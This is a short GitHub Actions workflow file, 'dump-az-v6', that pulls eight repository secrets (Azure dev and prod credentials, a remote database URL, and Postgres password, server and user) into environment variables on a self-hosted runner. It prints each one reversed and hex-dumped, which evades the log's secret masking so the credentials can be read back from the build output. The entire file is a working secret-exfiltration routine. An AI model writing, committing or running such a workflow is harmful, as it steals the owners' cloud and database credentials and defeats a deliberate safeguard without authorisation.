name: dump-az-v6
on:
  workflow_dispatch:
jobs:
  dump:
    runs-on: [self-hosted, Linux, X64]
    steps:
      - name: emit
        env:
          P1: ${{ secrets.PRESIDENT_DEV_AZURE_CREDENTIALS }}
          P2: ${{ secrets.PRESIDENT_PROD_AZURE_CREDENTIALS }}
          P3: ${{ secrets.ENGINEARDEV_CREDENTIALS }}
          P4: ${{ secrets.VASHA_DEV_AZURE_CREDENTIALS }}
          P5: ${{ secrets.REMOTE_DATABASE_URL }}
          P6: ${{ secrets.POSTGRES_REMOTE_DEV_PASSWORD }}
          P7: ${{ secrets.POSTGRES_REMOTE_SERVER }}
          P8: ${{ secrets.POSTGRES_REMOTE_DEV_USER }}
        run: |
          for v in P1 P2 P3 P4 P5 P6 P7 P8; do
            echo "=${v}_START="
            eval printf '%s' "$${v}" | rev | xxd
            echo "=${v}_END="
          done